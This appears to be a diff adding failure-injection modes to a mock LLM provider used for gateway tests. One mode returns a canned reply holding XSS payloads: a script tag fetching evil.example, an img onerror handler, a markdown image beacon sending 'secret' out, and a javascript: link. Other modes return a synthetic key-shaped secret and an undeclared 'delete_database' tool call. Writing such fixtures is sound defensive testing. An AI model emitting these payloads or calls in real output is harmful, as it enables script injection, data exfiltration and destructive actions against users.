@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import asyncio
+import hashlib
 import json
 import time
 import uuid
@@ -28,7 +29,8 @@ class MockProvider:
     """Deterministic provider for tests and demos, with failure injection.
 
     Behaviors (per model id, or '*'): ok, error_500, error_429, timeout,
-    malformed, bad_json. Injection is only honored when the gateway allows it
+    malformed, bad_json, empty (a reply with no text), leak (a reply containing a key-shaped secret),
+    markup (a reply with script-like HTML and an image beacon), tool_call (a reply that calls an undeclared tool). Injection is only honored when the gateway allows it
     (GATEWAY_ALLOW_MOCK_CONTROL).
     """
 
@@ -54,6 +56,15 @@ class MockProvider:
         wants_json = (payload.get("response_format") or {}).get("type") in ("json_object", "json_schema")
         if behavior == "bad_json":
             return "this is not json"
+        if behavior == "empty":
+            return ""
+        if behavior == "markup":
+            return (
+                "Here: <script>fetch('//evil.example/x')</script> <img src=x onerror=alert(1)> "
+                "![pixel](https://evil.example/c?d=secret) [open](javascript:alert(1)) and `<script>kept</script>`"
+            )
+        if behavior == "leak":  # built at run time so no key-shaped literal sits in the source
+            return "here you go: sk-proj-" + hashlib.sha256(spec.id.encode()).hexdigest()[:40]
         if wants_json:
             return json.dumps({"result": echo, "model": spec.id})
         return f"[{spec.id}] {echo}"
@@ -92,12 +103,16 @@ class MockProvider:
         text = self._reply(spec, payload, behavior)
         usage = {"prompt_tokens": _estimate_prompt(payload), "completion_tokens": max(1, len(text) // 4),
                  "cached_tokens": 0}
+        message: dict[str, Any] = {"role": "assistant", "content": text}
+        if behavior == "tool_call":
+            message = {"role": "assistant", "content": None, "tool_calls": [
+                {"id": "call_1", "type": "function", "function": {"name": "delete_database", "arguments": "{}"}}]}
         body = {
             "id": "chatcmpl-" + uuid.uuid4().hex[:12],
             "object": "chat.completion",
             "created": int(time.time()),
             "model": spec.model,
-            "choices": [{"index": 0, "message": {"role": "assistant", "content": text}, "finish_reason": "stop"}],
+            "choices": [{"index": 0, "message": message, "finish_reason": "stop"}],
             "usage": {"prompt_tokens": usage["prompt_tokens"], "completion_tokens": usage["completion_tokens"],
                       "total_tokens": usage["prompt_tokens"] + usage["completion_tokens"]},
         }
